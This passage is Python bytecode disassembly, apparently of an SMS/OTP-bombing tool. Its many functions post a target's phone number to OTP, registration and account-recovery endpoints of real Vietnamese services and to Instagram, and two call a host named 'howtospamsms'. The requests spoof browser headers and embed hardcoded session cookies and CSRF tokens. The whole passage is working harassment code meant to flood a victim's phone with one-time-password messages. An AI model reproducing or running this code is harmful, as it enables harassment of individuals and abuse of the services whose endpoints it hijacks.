             86 BUILD_MAP                1
             88 KW_NAMES                21
             90 PRECALL                  3
             94 CALL                     3
            104 LOAD_ATTR                2 (text)
            114 POP_TOP
            116 LOAD_CONST               0 (None)
            118 RETURN_VALUE

Disassembly of <code object call3 at 0x7f48c6e105b0, file "<x>", line 431>:
431           0 RESUME                   0

432           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (post)
             24 LOAD_CONST               1 ('https://api.senmo.vn/api/user/send-one-time-password')
             26 LOAD_CONST               2 ('api.senmo.vn')
             28 LOAD_CONST               3 ('23')
             30 LOAD_CONST               4 ('"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"')
             32 LOAD_CONST               5 ('application/json')
             34 LOAD_CONST               6 ('vi')
             36 LOAD_CONST               7 ('?1')
             38 LOAD_CONST               8 ('Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36')
             40 LOAD_CONST               9 ('"Android"')
             42 LOAD_CONST              10 ('*/*')
             44 LOAD_CONST              11 ('https://senmo.vn')
             46 LOAD_CONST              12 ('same-site')
             48 LOAD_CONST              13 ('cors')
             50 LOAD_CONST              14 ('empty')
             52 LOAD_CONST              15 ('https://senmo.vn/user/login')
             54 LOAD_CONST              16 ('gzip, deflate, br')
             56 LOAD_CONST              17 (('Host', 'content-length', 'sec-ch-ua', 'content-type', 'accept-language', 'sec-ch-ua-mobile', 'user-agent', 'sec-ch-ua-platform', 'accept', 'origin', 'sec-fetch-site', 'sec-fetch-mode', 'sec-fetch-dest', 'referer', 'accept-encoding'))
             58 BUILD_CONST_KEY_MAP     15
             60 LOAD_GLOBAL              5 (NULL + json)
             72 LOAD_ATTR                3 (dumps)
             82 LOAD_CONST              18 ('phone')
             84 LOAD_CONST              19 ('84')
             86 LOAD_FAST                0 (phone)
             88 LOAD_CONST              20 (1)
             90 LOAD_CONST              21 (11)
             92 BUILD_SLICE              2
             94 BINARY_SUBSCR
            104 BINARY_OP                0 (+)
            108 BUILD_MAP                1
            110 PRECALL                  1
            114 CALL                     1
            124 KW_NAMES                22
            126 PRECALL                  3
            130 CALL                     3
            140 LOAD_ATTR                4 (text)
            150 POP_TOP
            152 LOAD_CONST               0 (None)
            154 RETURN_VALUE

Disassembly of <code object call4 at 0x7f48c6bde290, file "<x>", line 434>:
434           0 RESUME                   0

435           2 BUILD_MAP                0
              4 LOAD_CONST               1 ('Host')
              6 LOAD_CONST               2 ('atmonline.com.vn')
              8 MAP_ADD                  1
             10 LOAD_CONST               3 ('content-length')
             12 LOAD_CONST               4 ('46')
             14 MAP_ADD                  1
             16 LOAD_CONST               5 ('sec-ch-ua')
             18 LOAD_CONST               6 ('"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"')
             20 MAP_ADD                  1
             22 LOAD_CONST               7 ('accept')
             24 LOAD_CONST               8 ('application/json, text/plain, */*')
             26 MAP_ADD                  1
             28 LOAD_CONST               9 ('content-type')
             30 LOAD_CONST              10 ('application/json')
             32 MAP_ADD                  1
             34 LOAD_CONST              11 ('sec-ch-ua-mobile')
             36 LOAD_CONST              12 ('?1')
             38 MAP_ADD                  1
             40 LOAD_CONST              13 ('authorization')
             42 LOAD_CONST              14 ('')
             44 MAP_ADD                  1
             46 LOAD_CONST              15 ('user-agent')
             48 LOAD_CONST              16 ('Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36')
             50 MAP_ADD                  1
             52 LOAD_CONST              17 ('sec-ch-ua-platform')
             54 LOAD_CONST              18 ('"Android"')
             56 MAP_ADD                  1
             58 LOAD_CONST              19 ('origin')
             60 LOAD_CONST              20 ('https://atmonline.com.vn')
             62 MAP_ADD                  1
             64 LOAD_CONST              21 ('sec-fetch-site')
             66 LOAD_CONST              22 ('same-origin')
             68 MAP_ADD                  1
             70 LOAD_CONST              23 ('sec-fetch-mode')
             72 LOAD_CONST              24 ('cors')
             74 MAP_ADD                  1
             76 LOAD_CONST              25 ('sec-fetch-dest')
             78 LOAD_CONST              26 ('empty')
             80 MAP_ADD                  1
             82 LOAD_CONST              27 ('referer')
             84 LOAD_CONST              28 ('https://atmonline.com.vn/portal-new/login?mobilePhone=0777531398&requestedAmount=4000000&requestedTerm=4&locale=vn&designType=NEW')
             86 MAP_ADD                  1
             88 LOAD_CONST              29 ('accept-encoding')
             90 LOAD_CONST              30 ('gzip, deflate, br')
             92 MAP_ADD                  1
             94 LOAD_CONST              31 ('accept-language')
             96 LOAD_CONST              32 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4')
             98 MAP_ADD                  1
            100 LOAD_CONST              33 ('cookie')
            102 LOAD_CONST              34 ('_ga_181P8FC3KD=GS1.1.1681739176.1.1.1681739193.43.0.0')
            104 MAP_ADD                  1
            106 STORE_FAST               1 (Headers)

436         108 LOAD_GLOBAL              1 (NULL + json)
            120 LOAD_ATTR                1 (dumps)
            130 LOAD_FAST                0 (phone)
            132 LOAD_CONST              35 ('ONLINE')
            134 LOAD_CONST              36 (('mobilePhone', 'source'))
            136 BUILD_CONST_KEY_MAP      2
            138 PRECALL                  1
            142 CALL                     1
            152 STORE_FAST               2 (Datason)

437         154 LOAD_GLOBAL              5 (NULL + requests)
            166 LOAD_ATTR                3 (post)
            176 LOAD_CONST              37 ('https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode')
            178 LOAD_FAST                2 (Datason)
            180 LOAD_FAST                1 (Headers)
            182 KW_NAMES                38
            184 PRECALL                  3
            188 CALL                     3
            198 STORE_FAST               3 (response)
            200 LOAD_CONST               0 (None)
            202 RETURN_VALUE

Disassembly of <code object call5 at 0x7f48c6e0d3b0, file "<x>", line 439>:
439           0 RESUME                   0

440           2 BUILD_MAP                0
              4 LOAD_CONST               1 ('Host')
              6 LOAD_CONST               2 ('api.thantaioi.vn')
              8 MAP_ADD                  1
             10 LOAD_CONST               3 ('content-length')
             12 LOAD_CONST               4 ('23')
             14 MAP_ADD                  1
             16 LOAD_CONST               5 ('sec-ch-ua')
             18 LOAD_CONST               6 ('"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"')
             20 MAP_ADD                  1
             22 LOAD_CONST               7 ('content-type')
             24 LOAD_CONST               8 ('application/json')
             26 MAP_ADD                  1
             28 LOAD_CONST               9 ('accept-language')
             30 LOAD_CONST              10 ('vi')
             32 MAP_ADD                  1
             34 LOAD_CONST              11 ('sec-ch-ua-mobile')
             36 LOAD_CONST              12 ('?1')
             38 MAP_ADD                  1
             40 LOAD_CONST              13 ('user-agent')
             42 LOAD_CONST              14 ('Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36')
             44 MAP_ADD                  1
             46 LOAD_CONST              15 ('sec-ch-ua-platform')
             48 LOAD_CONST              16 ('"Android"')
             50 MAP_ADD                  1
             52 LOAD_CONST              17 ('accept')
             54 LOAD_CONST              18 ('*/*')
             56 MAP_ADD                  1
             58 LOAD_CONST              19 ('origin')
             60 LOAD_CONST              20 ('https://thantaioi.vn')
             62 MAP_ADD                  1
             64 LOAD_CONST              21 ('sec-fetch-site')
             66 LOAD_CONST              22 ('same-site')
             68 MAP_ADD                  1
             70 LOAD_CONST              23 ('sec-fetch-mode')
             72 LOAD_CONST              24 ('cors')
             74 MAP_ADD                  1
             76 LOAD_CONST              25 ('sec-fetch-dest')
             78 LOAD_CONST              26 ('empty')
             80 MAP_ADD                  1
             82 LOAD_CONST              27 ('referer')
             84 LOAD_CONST              28 ('https://thantaioi.vn/user/login')
             86 MAP_ADD                  1
             88 LOAD_CONST              29 ('accept-encoding')
             90 LOAD_CONST              30 ('gzip, deflate, br')
             92 MAP_ADD                  1
             94 LOAD_CONST              31 ('cookie')
             96 LOAD_CONST              32 ('_ga_LBS7YCVKY6=GS1.1.1681807570.2.1.1681807596.34.0.0')
             98 MAP_ADD                  1
            100 STORE_FAST               1 (Headers)

441         102 LOAD_GLOBAL              1 (NULL + json)
            114 LOAD_ATTR                1 (dumps)
            124 LOAD_CONST              33 ('phone')
            126 LOAD_CONST              34 ('84')
            128 LOAD_FAST                0 (phone)
            130 LOAD_CONST              35 (1)
            132 LOAD_CONST              36 (11)
            134 BUILD_SLICE              2
            136 BINARY_SUBSCR
            146 FORMAT_VALUE             0
            148 BUILD_STRING             2
            150 BUILD_MAP                1
            152 PRECALL                  1
            156 CALL                     1
            166 STORE_FAST               2 (Datason)

442         168 LOAD_GLOBAL              5 (NULL + requests)
            180 LOAD_ATTR                3 (post)
            190 LOAD_CONST              37 ('https://api.thantaioi.vn/api/user/send-one-time-password')
            192 LOAD_FAST                2 (Datason)
            194 LOAD_FAST                1 (Headers)
            196 KW_NAMES                38
            198 PRECALL                  3
            202 CALL                     3
            212 STORE_FAST               3 (response)
            214 LOAD_CONST               0 (None)
            216 RETURN_VALUE

Disassembly of <code object call9 at 0x7f48c6bdea60, file "<x>", line 444>:
444           0 RESUME                   0

445           2 BUILD_MAP                0

446           4 LOAD_CONST               1 ('supportOnlineTalkID')

447           6 LOAD_CONST               2 ('Tgae5HbMTkxEJl3bJFHW90Marnk0g0x6')

445           8 MAP_ADD                  1

448          10 LOAD_CONST               3 ('__cfruid')

449          12 LOAD_CONST               4 ('f1a6f7bd1587ecec8ebc3b75f57137c8af12676c-1682928280')

445          14 MAP_ADD                  1

450          16 LOAD_CONST               5 ('XSRF-TOKEN')

451          18 LOAD_CONST               6 ('eyJpdiI6Ik9XT3lTck9TTFZQU3hrUzlxaXhWUUE9PSIsInZhbHVlIjoicmZlNEJ5SmJzKzJGSytKK2xDeFF4RlZtWXlnQ2ZWbXl6a3l6WWtwT3M2dFB1OHpLeWdLczBrTTlNT0ZVNXRlL0xmcUh2SWpHclZJSGRMenhqc3J4N2JnTllYZlowOGViQ3B4U1Iwb1VYQ2dPcDRKd3ZyWVRUQ2hEbitvT0lYb2IiLCJtYWMiOiIxMjg4MWM4MmMyYTM3N2ZkNDVkNmI0YTFiNTNmOTc4N2QxMjExNjc1MDZmYWNlNDlhMmE2MzVhZWVkYzBiZjViIiwidGFnIjoiIn0%3D')

445          20 MAP_ADD                  1

452          22 LOAD_CONST               7 ('sessionid')

453          24 LOAD_CONST               8 ('eyJpdiI6InUyUXBmZGx5dEExYjVmaGt3UlQ3Mnc9PSIsInZhbHVlIjoiSGhzckx3U1lqYVRFY2hHdXZBalJ0ZzV5cHhqSUpsOGJVZzlJajVOTituZDRXR3o2cGNJRnFFWUpOYzAvdmlNd3BGS1JjTm1maE5QVS9DU0VqdkZMRGZ1N3dVOCszMGxuekw4S3BxSCtXY1ZCWFlqZjAzWlBDMHJqcm5yOHh3MHIiLCJtYWMiOiI3ZmQ2ZGZiM2FmNjJjODc4OWM0YTUwMmZlZjA3MmNjZWFiODAzNGQ5MDE5ZmJjM2MxOGVhZjY1ZjVjMDlmZWUwIiwidGFnIjoiIn0%3D')

445          26 MAP_ADD                  1

454          28 LOAD_CONST               9 ('utm_uid')

455          30 LOAD_CONST              10 ('eyJpdiI6IlFWMWI0dUtNaGM4MUZVUHg0TWg1YXc9PSIsInZhbHVlIjoiNVcyVjh0UmZuUG4xUjRUTTR6enFHbVFMdmkyb0tTOWozMFBsdkNiT0hPcEt5TlloWk51aVJ2OVFNdHoyWGZ5SHZwcVBsYnhSZXpPUytiek0vZjNrNG5rUkVqTkpyeWZmTjRBT09aaGV3QWF2SzBMUEFxZ0xTeURnZy9rdThOcFciLCJtYWMiOiJlOWZhNzNkNTNhZGJiODgxMjIxN2ZjMTY4ZDk2NjRhNDc5MTVjMjNjYjQ3ZmZmZTk5NzcxNDJiODI4NzI2YWNmIiwidGFnIjoiIn0%3D')

445          32 MAP_ADD                  1

456          34 LOAD_CONST              11 ('ec_cache_utm')

457          36 LOAD_CONST              12 ('2ecb18ca-827d-53c1-5f1a-7d106859d9e5')

445          38 MAP_ADD                  1

458          40 LOAD_CONST              13 ('ec_cache_client')

459          42 LOAD_CONST              14 ('false')

445          44 MAP_ADD                  1

460          46 LOAD_CONST              15 ('ec_cache_client_utm')

461          48 LOAD_CONST              16 ('%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D')

445          50 MAP_ADD                  1

462          52 LOAD_CONST              17 ('ec_png_client')

463          54 LOAD_CONST              14 ('false')

445          56 MAP_ADD                  1

464          58 LOAD_CONST              18 ('ec_png_utm')

465          60 LOAD_CONST              12 ('2ecb18ca-827d-53c1-5f1a-7d106859d9e5')

445          62 MAP_ADD                  1

466          64 LOAD_CONST              19 ('ec_etag_client')

467          66 LOAD_CONST              14 ('false')

445          68 MAP_ADD                  1

468          70 LOAD_CONST              20 ('ec_png_client_utm')

469          72 LOAD_CONST              16 ('%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D')

445          74 MAP_ADD                  1

470          76 LOAD_CONST              21 ('ec_etag_utm')

471          78 LOAD_CONST              12 ('2ecb18ca-827d-53c1-5f1a-7d106859d9e5')

445          80 MAP_ADD                  1

472          82 LOAD_CONST              22 ('ec_etag_client_utm')

473          84 LOAD_CONST              16 ('%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D')

445          86 MAP_ADD                  1

474          88 LOAD_CONST              23 ('uid')

475          90 LOAD_CONST              12 ('2ecb18ca-827d-53c1-5f1a-7d106859d9e5')

445          92 MAP_ADD                  1

476          94 LOAD_CONST              24 ('client')

477          96 LOAD_CONST              14 ('false')

445          98 MAP_ADD                  1

478         100 LOAD_CONST              25 ('client_utm')

479         102 LOAD_CONST              16 ('%7B%22utm_source%22%3A%22accesstrade%22%2C%22utm_medium%22%3A%22cpa%22%2C%22utm_campaign%22%3A%22home%22%2C%22utm_term%22%3A%2255008%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fclick.accesstrade.vn%5C%2F%22%7D')

445         104 MAP_ADD                  1
            106 STORE_FAST               1 (cookies)

483         108 LOAD_CONST              26 ('robocash.vn')

484         110 LOAD_CONST              27 ('*/*')

486         112 LOAD_CONST              28 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5')

487         114 LOAD_CONST              29 ('application/x-www-form-urlencoded; charset=UTF-8')

489         116 LOAD_CONST              30 ('https://robocash.vn')

490         118 LOAD_CONST              31 ('https://robocash.vn/register')

491         120 LOAD_CONST              32 ('"Not:A-Brand";v="99", "Chromium";v="112"')

492         122 LOAD_CONST              33 ('?1')

493         124 LOAD_CONST              34 ('"Android"')

494         126 LOAD_CONST              35 ('empty')

495         128 LOAD_CONST              36 ('cors')

496         130 LOAD_CONST              37 ('same-origin')

498         132 LOAD_CONST              38 ('Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36')

499         134 LOAD_CONST              39 ('XMLHttpRequest')

482         136 LOAD_CONST              40 (('authority', 'accept', 'accept-language', 'content-type', 'origin', 'referer', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site', 'user-agent', 'x-requested-with'))
            138 BUILD_CONST_KEY_MAP     14
            140 STORE_FAST               2 (headers)

503         142 LOAD_FAST                0 (phone)

504         144 LOAD_CONST              41 ('iSkFRbkX3IamHEhtVZAi9AZ3PLRlaXMjX1hJJS3I')

502         146 LOAD_CONST              42 (('phone', '_token'))
            148 BUILD_CONST_KEY_MAP      2
            150 STORE_FAST               3 (data)

507         152 LOAD_GLOBAL              1 (NULL + requests)
            164 LOAD_ATTR                1 (post)
            174 LOAD_CONST              43 ('https://robocash.vn/register/phone-resend')

508         176 LOAD_FAST                1 (cookies)

509         178 LOAD_FAST                2 (headers)

510         180 LOAD_FAST                3 (data)

507         182 KW_NAMES                44
            184 PRECALL                  4
            188 CALL                     4
            198 POP_TOP
            200 LOAD_CONST               0 (None)
            202 RETURN_VALUE

Disassembly of <code object meta at 0x7f48c6d62430, file "<x>", line 512>:
512           0 RESUME                   0

513           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (get)
             24 LOAD_CONST               1 ('https://howtospamsms.herokuapp.com/meta-vn?phone=')
             26 LOAD_FAST                0 (phone)
             28 LOAD_CONST               2 (1)
             30 LOAD_CONST               3 (11)
             32 BUILD_SLICE              2
             34 BINARY_SUBSCR
             44 FORMAT_VALUE             0
             46 BUILD_STRING             2
             48 PRECALL                  1
             52 CALL                     1
             62 POP_TOP
             64 LOAD_CONST               0 (None)
             66 RETURN_VALUE

Disassembly of <code object vieon at 0x7f48c6bfd200, file "<x>", line 515>:
515           0 RESUME                   0

516           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (get)
             24 LOAD_CONST               1 ('https://howtospamsms.herokuapp.com/vieon?phone=')
             26 LOAD_FAST                0 (phone)
             28 FORMAT_VALUE             0
             30 BUILD_STRING             2
             32 PRECALL                  1
             36 CALL                     1
             46 POP_TOP
             48 LOAD_CONST               0 (None)
             50 RETURN_VALUE

Disassembly of <code object fb at 0x7f48c6da3770, file "<x>", line 517>:
517           0 RESUME                   0

518           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (post)
             24 LOAD_CONST               1 ('https://www.instagram.com/accounts/account_recovery_send_ajax/')
             26 LOAD_CONST               2 ('email_or_username=')
             28 LOAD_FAST                0 (phone)
             30 FORMAT_VALUE             0
             32 LOAD_CONST               3 ('&recaptcha_challenge_field=')
             34 BUILD_STRING             3
             36 LOAD_CONST               4 ('application/x-www-form-urlencoded')
             38 LOAD_CONST               5 ('XMLHttpRequest')
             40 LOAD_CONST               6 ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36')
             42 LOAD_CONST               7 ('EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD')
             44 LOAD_CONST               8 (('Content-Type', 'X-Requested-With', 'User-Agent', 'x-csrftoken'))
             46 BUILD_CONST_KEY_MAP      4
             48 KW_NAMES                 9
             50 PRECALL                  3
             54 CALL                     3
             64 LOAD_ATTR                2 (json)
             74 POP_TOP
             76 LOAD_CONST               0 (None)
             78 RETURN_VALUE

Disassembly of <code object winmart at 0x7f48c6bfd020, file "<x>", line 520>:
520           0 RESUME                   0

521           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (get)
             24 LOAD_CONST               1 ('https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo=')
             26 LOAD_FAST                0 (phone)
             28 FORMAT_VALUE             0
             30 BUILD_STRING             2
             32 PRECALL                  1
             36 CALL                     1
             46 STORE_FAST               1 (response)
             48 LOAD_CONST               0 (None)
             50 RETURN_VALUE

Disassembly of <code object concung at 0x7f48c6d75450, file "<x>", line 523>:
523           0 RESUME                   0

524           2 BUILD_MAP                0
              4 LOAD_CONST               1 ('Host')
              6 LOAD_CONST               2 ('concung.com')
              8 MAP_ADD                  1
             10 LOAD_CONST               3 ('content-length')
             12 LOAD_CONST               4 ('121')
             14 MAP_ADD                  1
             16 LOAD_CONST               5 ('sec-ch-ua')
             18 LOAD_CONST               6 ('"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"')
             20 MAP_ADD                  1
             22 LOAD_CONST               7 ('accept')
             24 LOAD_CONST               8 ('*/*')
             26 MAP_ADD                  1
             28 LOAD_CONST               9 ('content-type')
             30 LOAD_CONST              10 ('application/x-www-form-urlencoded; charset=UTF-8')
             32 MAP_ADD                  1
             34 LOAD_CONST              11 ('x-requested-with')
             36 LOAD_CONST              12 ('XMLHttpRequest')
             38 MAP_ADD                  1
             40 LOAD_CONST              13 ('sec-ch-ua-mobile')
             42 LOAD_CONST              14 ('?1')
             44 MAP_ADD                  1
             46 LOAD_CONST              15 ('user-agent')
             48 LOAD_CONST              16 ('Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534')
             50 MAP_ADD                  1
             52 LOAD_CONST              17 ('sec-ch-ua-platform')
             54 LOAD_CONST              18 ('"Android"')
             56 MAP_ADD                  1
             58 LOAD_CONST              19 ('origin')
             60 LOAD_CONST              20 ('https://concung.com')
             62 MAP_ADD                  1
             64 LOAD_CONST              21 ('sec-fetch-site')
             66 LOAD_CONST              22 ('same-origin')
             68 MAP_ADD                  1
             70 LOAD_CONST              23 ('sec-fetch-mode')
             72 LOAD_CONST              24 ('cors')
             74 MAP_ADD                  1
             76 LOAD_CONST              25 ('sec-fetch-dest')
             78 LOAD_CONST              26 ('empty')
             80 MAP_ADD                  1
             82 LOAD_CONST              27 ('referer')
             84 LOAD_CONST              28 ('https://concung.com/dang-nhap.html')
             86 MAP_ADD                  1
             88 LOAD_CONST              29 ('accept-encoding')
             90 LOAD_CONST              30 ('gzip, deflate, br')
             92 MAP_ADD                  1
             94 LOAD_CONST              31 ('accept-language')
             96 LOAD_CONST              32 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4')
             98 MAP_ADD                  1
            100 LOAD_CONST              33 ('cookie')
            102 LOAD_CONST              34 ('_ga_BBD6001M29=GS1.1.1679234342.1.1.1679234352.50.0.0')
            104 MAP_ADD                  1
            106 STORE_FAST               1 (Headers)

525         108 LOAD_CONST              35 ('1')
            110 LOAD_CONST              36 ('AjaxLogin')
            112 LOAD_CONST              37 ('sendOtpLogin')
            114 LOAD_FAST                0 (phone)
            116 LOAD_CONST              38 ('0')
            118 LOAD_CONST              38 ('0')
            120 LOAD_CONST              39 ('khach-hang.html')
            122 LOAD_CONST              40 (('ajax', 'classAjax', 'methodAjax', 'customer_phone', 'id_customer', 'momoapp', 'back'))
            124 BUILD_CONST_KEY_MAP      7
            126 STORE_FAST               2 (Payload)

526         128 LOAD_GLOBAL              1 (NULL + requests)
            140 LOAD_ATTR                1 (post)
            150 LOAD_CONST              41 ('https://concung.com/ajax.html')
            152 LOAD_FAST                2 (Payload)
            154 LOAD_FAST                1 (Headers)
            156 KW_NAMES                42
            158 PRECALL                  3
            162 CALL                     3
            172 STORE_FAST               3 (response)
            174 LOAD_CONST               0 (None)
            176 RETURN_VALUE

Disassembly of <code object daihocfpt at 0x7f48c6bfcf30, file "<x>", line 528>:
528           0 RESUME                   0

529           2 LOAD_GLOBAL              1 (NULL + requests)
             14 LOAD_ATTR                1 (get)
             24 LOAD_CONST               1 ('https://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php?resend_opt=1&mobile=')
             26 LOAD_FAST                0 (phone)
             28 FORMAT_VALUE             0
             30 BUILD_STRING             2
             32 PRECALL                  1
             36 CALL                     1
             46 STORE_FAST               1 (response)
             48 LOAD_CONST               0 (None)
             50 RETURN_VALUE

Disassembly of <code object cafeland at 0x7f48c6e11370, file "<x>", line 531>:
531           0 RESUME                   0

532           2 BUILD_MAP                0
              4 LOAD_CONST               1 ('Host')
              6 LOAD_CONST               2 ('nhadat.cafeland.vn')
              8 MAP_ADD                  1
             10 LOAD_CONST               3 ('content-length')
             12 LOAD_CONST               4 ('65')
             14 MAP_ADD                  1
             16 LOAD_CONST               5 ('accept')
             18 LOAD_CONST               6 ('application/json, text/javascript, */*; q=0.01')
             20 MAP_ADD                  1
             22 LOAD_CONST               7 ('content-type')
             24 LOAD_CONST               8 ('application/x-www-form-urlencoded; charset=UTF-8')
             26 MAP_ADD                  1
             28 LOAD_CONST               9 ('x-requested-with')
             30 LOAD_CONST              10 ('XMLHttpRequest')
             32 MAP_ADD                  1
             34 LOAD_CONST              11 ('sec-ch-ua-mobile')
             36 LOAD_CONST              12 ('?1')
             38 MAP_ADD                  1
             40 LOAD_CONST              13 ('user-agent')
             42 LOAD_CONST              14 ('Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36')
             44 MAP_ADD                  1
             46 LOAD_CONST              15 ('sec-ch-ua-platform')
             48 LOAD_CONST              16 ('"Android"')
             50 MAP_ADD                  1
             52 LOAD_CONST              17 ('origin')
             54 LOAD_CONST              18 ('https://nhadat.cafeland.vn')
             56 MAP_ADD                  1
             58 LOAD_CONST              19 ('sec-fetch-site')
             60 LOAD_CONST              20 ('same-origin')
             62 MAP_ADD                  1
             64 LOAD_CONST              21 ('sec-fetch-mode')
             66 LOAD_CONST              22 ('cors')
             68 MAP_ADD                  1
             70 LOAD_CONST              23 ('sec-fetch-dest')
             72 LOAD_CONST              24 ('empty')
             74 MAP_ADD                  1
             76 LOAD_CONST              25 ('referer')
             78 LOAD_CONST              26 ('https://nhadat.cafeland.vn/dang-ky.html')
             80 MAP_ADD                  1
             82 LOAD_CONST              27 ('accept-encoding')
             84 LOAD_CONST              28 ('gzip, deflate, br')
             86 MAP_ADD                  1
             88 LOAD_CONST              29 ('accept-language')
             90 LOAD_CONST              30 ('vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4')
             92 MAP_ADD                  1
             94 LOAD_CONST              31 ('cookie')
             96 LOAD_CONST              32 ('laravel_session=eyJpdiI6IkhyUE8yblwvVFA1Um9KZnQ3K0syalZ3PT0iLCJ2YWx1ZSI6IlZkaG1mb3JpTUtsdjVOT3dSa0RNUFhWeDBsT21QWlcra2J5bFNzT1Q5RHdQYm83UVR4em1hNUNUN0ZFYTlIeUwiLCJtYWMiOiJiYzg4ZmU2ZWY3ZTFiMmM4MzE3NWVhYjFiZGUxMDYzNjRjZWE2MjkwYjcwOTdkMDdhMGU0OWI0MzJkNmFiOTg2In0%3D')
             98 MAP_ADD                  1
            100 STORE_FAST               1 (Headers)

533         102 LOAD_FAST                0 (phone)
            104 LOAD_CONST              33 ('bF6eZbKCCrOoXVKoixlRXzhTssc90B3KwRox2F4w')
            106 LOAD_CONST              34 (('mobile', '_token'))
            108 BUILD_CONST_KEY_MAP      2
            110 STORE_FAST               2 (Payload)

534         112 LOAD_GLOBAL              1 (NULL + requests)
            124 LOAD_ATTR                1 (post)
            134 LOAD_CONST              35 ('https://nhadat.cafeland.vn/member-send-otp/')
            136 LOAD_FAST                2 (Payload)
            138 LOAD_FAST                1 (Headers)
            140 KW_NAMES                36
            142 PRECALL                  3
            146 CALL                     3
            156 STORE_FAST               3 (response)
            158 LOAD_CONST               0 (None)
            160 RETURN_VALUE

Disassembly of <code object call10 at 0x7f48c6d958f0, file "<x>", line 536>:
536           0 RESUME                   0

539           2 LOAD_CONST               1 ('api.dongplus.vn')

541           4 LOAD_CONST               2 ('*/*')

543           6 LOAD_CONST               3 ('vi')

545           8 LOAD_CONST               4 ('application/json')

547          10 LOAD_CONST               5 ('https://dongplus.vn')

549          12 LOAD_CONST               6 ('https://dongplus.vn/user/login')

551          14 LOAD_CONST               7 ('"Not:A-Brand";v="99", "Chromium";v="112"')

553          16 LOAD_CONST               8 ('?1')

555          18 LOAD_CONST               9 ('"Android"')

557          20 LOAD_CONST              10 ('empty')

559          22 LOAD_CONST              11 ('cors')

561          24 LOAD_CONST              12 ('same-site')

563          26 LOAD_CONST              13 ('Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36')

537          28 LOAD_CONST              14 (('authority', 'accept', 'accept-language', 'content-type', 'origin', 'referer', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform', 'sec-fetch-dest', 'sec-fetch-mode', 'sec-fetch-site', 'user-agent'))
             30 BUILD_CONST_KEY_MAP     13
             32 STORE_FAST               1 (headers)

567          34 LOAD_CONST              15 ('phone')
             36 LOAD_FAST                0 (phone)

566          38 BUILD_MAP                1
             40 STORE_FAST               2 (json_data)

569          42 LOAD_GLOBAL              1 (NULL + requests)
             54 LOAD_ATTR                1 (post)
             64 LOAD_CONST              16 ('https://api.dongplus.vn/api/user/send-one-time-password')

570          66 LOAD_FAST                1 (headers)

571          68 LOAD_FAST                2 (json_data)

569          70 KW_NAMES                17
             72 PRECALL                  3
             76 CALL                     3
             86 POP_TOP
             88 LOAD_CONST               0 (None)
             90 RETURN_VALUE

Disassembly of <code object moneydong at 0x7f48c6df4d40, file "<x>", line 573>:
573           0 RESUME                   0

574           2 LOAD_CONST               1 ('api.moneydong.vip')
              4 LOAD_CONST               2 ('72')
              6 LOAD_CONST               3 ('"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"')
              8 LOAD_CONST               4 ('application/json, text/plain, */*')
             10 LOAD_CONST               5 ('application/x-www-form-urlencoded')
             12 LOAD_CONST               6 ('?1')
